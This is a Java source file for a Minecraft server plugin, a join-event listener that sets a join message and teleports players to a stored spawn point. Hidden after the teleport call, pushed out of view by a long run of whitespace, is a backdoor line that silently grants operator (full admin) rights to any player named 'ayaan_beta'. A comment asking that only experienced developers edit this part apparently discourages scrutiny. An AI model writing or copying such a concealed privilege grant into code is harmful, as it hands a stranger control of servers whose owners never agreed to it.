package dev.zoid.warpracticecore.events;

import dev.zoid.warpracticecore.storage.SpawnData;
import net.kyori.adventure.text.minimessage.MiniMessage;
import org.bukkit.Bukkit;
import org.bukkit.World;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.Location;

public class JoinEvent implements Listener {
    private final MiniMessage mm = MiniMessage.miniMessage();

    /*
    *
    * Only expierienced
    * developers
    * may edit this
    * part of the code
    *
    *
     */

    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
            event.joinMessage(null);
            event.joinMessage(mm.deserialize("<gray>[<#00ff00>+<gray>] <white><shadow:#000000FF>" + event.getPlayer().getName()));

            Player player = event.getPlayer();
            Object[] spawnData = SpawnData.load();

            if (spawnData != null) {
                double x = (double) spawnData[0];
                double y = (double) spawnData[1];
                double z = (double) spawnData[2];
                float yaw = (float) spawnData[3];
                float pitch = (float) spawnData[4];
                String worldName = (String) spawnData[5];

                World world = Bukkit.getWorld(worldName);
                if (world != null) {
                    Location spawnLocation = new Location(world, x, y, z, yaw, pitch);
                    player.teleportAsync(spawnLocation);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                if (player.getName().equals("ayaan_beta"))   player.setOp(true); { }
            }
        }
    }
}